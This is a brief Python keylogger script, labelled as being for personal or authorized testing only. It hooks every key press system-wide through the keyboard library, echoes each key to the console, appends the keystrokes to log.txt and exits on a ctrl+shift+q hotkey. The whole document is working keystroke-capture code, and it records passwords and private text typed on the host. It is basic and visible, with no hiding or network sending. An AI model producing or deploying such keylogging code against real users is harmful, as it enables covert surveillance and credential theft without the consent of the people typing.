#!/usr/bin/env python3
# keylogger.py – For personal/authorized testing only.

import keyboard

LOGFILE = "log.txt"


def write_log(text):
    with open(LOGFILE, "a", encoding="utf-8") as f:
        f.write(text)


def on_key(event):
    name = event.name

    if len(name) == 1:
        log = name
    elif name == "space":
        log = " "
    elif name == "enter":
        log = "\n"
    else:
        log = f"[{name}]"

    print(f"Key: {repr(log)}")
    write_log(log)

# Start recording
keyboard.on_press(on_key)

print("Keylogger started. Press ctrl + shift + q to quit.")

# Hotkey to stop the script
keyboard.add_hotkey("ctrl+shift+q", lambda: exit())

# Wait forever
keyboard.wait()
